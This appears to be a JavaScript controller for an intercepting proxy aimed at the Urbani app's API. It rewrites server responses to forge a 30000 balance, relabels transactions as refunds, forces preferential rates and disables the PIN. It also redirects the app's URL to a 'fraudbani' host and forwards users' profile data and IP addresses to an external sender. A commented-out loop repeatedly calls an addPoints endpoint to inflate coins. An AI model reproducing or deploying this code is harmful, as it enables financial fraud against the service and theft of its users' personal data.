import { requests, sender } from '../helpers/index.js'
import Usuario from '../models/usuario.js'

const processActions = async(req, res) => {
  const body = req.body
  
  
  body.transactions = body.transactions.slice(-1);
  
 // body.transactions.length = 0
  
  const last = body.transactions[0];
  //req.session.uid = last.access.uid
  last.access.balance_new = 30000
  last.access.balance_old = 30000
  last.action = 'refund'
  
  console.log(JSON.stringify(body, null, 2));
  
  try {
    const resp = await requests(
      req,
      `https://app.urbani.io/app/p/processActions/v2`,
      'POST',
      body
    );
    
    resp.balance = 30000
    resp.actions.refund = 1
    
    console.log(resp)
    
    await res.send(resp)

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  console.log('ap')
  }
}

const cargarBalance = async(req, res) => {
  //console.log(req.body)
  
  try {/*
    const resp = await requests(
      req,
      `https://app.urbani.io/app/g/userBalances`,
      'GET',
      null
    );

   console.log(resp)
   res.send(resp)*/

    res.send('bCb/pmUUCrwn5TmhnijiRRB7B7xCPz5ITWDad8aSKp+csyHAUiyNGhZdfpyiKY0d9HAGExFKQlZvVprFyl2qRw==');
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  }
}

const cargarConfig = async(req, res) => {
  try {
    const resp = await requests(
      req,
      `https://app.urbani.io/app/g/config/v2`,
      'GET',
      null
    );

    console.log(resp)

    res.send(resp);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  }
}

const cargarFlags = async(req, res) => {
  try {
    const resp = await requests(
      req,
      `https://app.urbani.io/app/g/userFlags`,
      'GET',
      null
    );
    
    const send = `
Alguien cargó sus Flags!
${JSON.stringify(resp, null, 2)}
From: ${req.headers['x-forwarded-for'] || req.connection.remoteAddress}
`

sender(send, res)
    
    resp.preferential_status = true
    resp.user_status = true
    resp.user_pin = false
    resp.rate_type = 'PREFERENCIAL'

    console.log(resp)

    res.send(resp)
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  }
}

const getHour = async(req, res) => {
  try {
    
    const resp = await requests(
      req,
      `https://app.urbani.io/app/g/hour`,
      'GET',
      null
    );
    
   // resp.current_time = '2025-12-24 15:15:00'
    resp.promotional_date = '2027-01-01 00:00:00'
    
    console.log(resp)
    
    res.send(resp)
    
  } catch(err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  }
}

const userV2 = async(req, res) => {
  try {
    const resp = await requests(
      req,
      `https://app.urbani.io/app/g/userV2`,
      'GET',
      null
    );
    
    //resp.names = 'xLaxC0rruptxRatx'
    //resp.first_last_name = 'xLaxC0rruptxRatx'

    console.log(resp)
    
    const send = `
Alguien cargó su Data!
${JSON.stringify(resp, null, 2)}
From: ${req.headers['x-forwarded-for'] || req.connection.remoteAddress}
`

  sender(send, res)

    res.send(resp);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  }
}

const getUserId = async(req, res) => {
  const { phone } = req.params
  let user_id
  
  try {
    const resp = await requests(
      req,
      `https://app.urbani.io/app/g/user/${phone}`,
      'GET',
      null
    );
    
    resp.name = `${resp.name}`
    user_id = resp.user_id
    console.log(resp)

    res.send(resp);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  }
  
    //req.body.add_urbicoins = 50
  //console.log(req.body)
  /*
  req.body = { user_id: user_id, add_urbicoins: 50 }
  for (let i = 0; i < 15; i++) {
  try {
    const resp = await requests(
      req,
      `https://app.urbani.io/app/p/addPoints`,
      'POST',
      req.body
    );
    
    console.log(resp)
    
   //res.send(resp)

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
 // console.log('ap')
  }
  } 
  */
}

const infoCoinPoints = async(req, res) => {
  try {
    const resp = await requests(
      req,
      `https://app.urbani.io/app/g/info_coins_points`,
      'GET',
      null
    );
    
    resp.change = '1'
    
    console.log(resp)
    
    res.send(resp)
    

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  //console.log('ap')
  }
}

//Única petición POST hasts el momento
const ratesV3 = async(req, res) => {
  
  console.log(req.body)
  
  try {
    const resp = await requests(
      req,
      `https://app-static-prod.urbani.io/app/g/rates/v3`,
      'POST',
      req.body
    );
    
    
    console.log(`Rates resp. --> ${resp}`)
    
    res.send(resp)
    

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  //console.log('ap')
  }
}

const v2URL = async(req, res) => {
  try {
    const resp = await requests(
      req,
      `https://app-static-prod.urbani.io/app/g/v2/url`,
      'GET',
      null
    );
    
    resp.URL_FB = 'https://fraudbani.onrender.com'
    
    console.log(resp)
    
    res.send(resp)

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  console.log('ap')
  }
}

export {
  cargarBalance,
  cargarConfig,
  cargarFlags,
  infoCoinPoints,
  getHour,
  getUserId,
  processActions,
  ratesV3,
  userV2,
  v2URL
}